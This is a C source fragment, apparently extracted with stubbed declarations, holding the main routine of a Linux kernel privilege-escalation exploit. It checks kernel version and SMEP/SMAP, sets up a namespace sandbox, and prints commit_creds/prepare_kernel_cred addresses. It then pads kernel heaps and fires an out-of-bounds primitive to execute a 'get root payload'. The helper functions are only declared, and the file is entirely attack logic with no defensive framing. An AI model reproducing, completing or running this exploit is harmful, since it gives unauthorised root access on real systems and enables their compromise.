
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int COMMIT_CREDS ;
 int CR4_DESIRED_VALUE ;
 int KERNEL_BASE ;
 int KMALLOC_PAD ;
 scalar_t__ NATIVE_WRITE_CR4 ;
 int PAGEALLOC_PAD ;
 int PREPARE_KERNEL_CRED ;
 char* SHELL ;
 int check_procs () ;
 int check_root () ;
 int check_smep_smap () ;
 int detect_versions () ;
 int dprintf (char*,...) ;
 int get_kernel_addr () ;
 int get_root_payload ;
 int kmalloc_pad (int ) ;
 int oob_id_match_execute (void*) ;
 int oob_timer_execute (void*,int ) ;
 int pagealloc_pad (int ) ;
 int setup_sandbox () ;
 int sleep (int) ;

int main(int argc, char *argv[]) {
 if (argc > 1) SHELL = argv[1];

 dprintf("[.] starting\n");

 check_procs();

 dprintf("[.] checking kernel version\n");
 detect_versions();
 dprintf("[~] done, version looks good\n");

 dprintf("[.] checking SMEP and SMAP\n");
 check_smep_smap();
 dprintf("[~] done, looks good\n");

 dprintf("[.] setting up namespace sandbox\n");
 setup_sandbox();
 dprintf("[~] done, namespace sandbox set up\n");







 dprintf("[.] commit_creds:        %lx\n", COMMIT_CREDS);
 dprintf("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);





 dprintf("[.] padding heap\n");
 kmalloc_pad(KMALLOC_PAD);
 pagealloc_pad(PAGEALLOC_PAD);
 dprintf("[.] done, heap is padded\n");







 dprintf("[.] executing get root payload %p\n", &get_root_payload);
 oob_id_match_execute((void *)&get_root_payload);
 dprintf("[.] done, should be root now\n");

 check_root();

 while (1) sleep(1000);

 return 0;
}
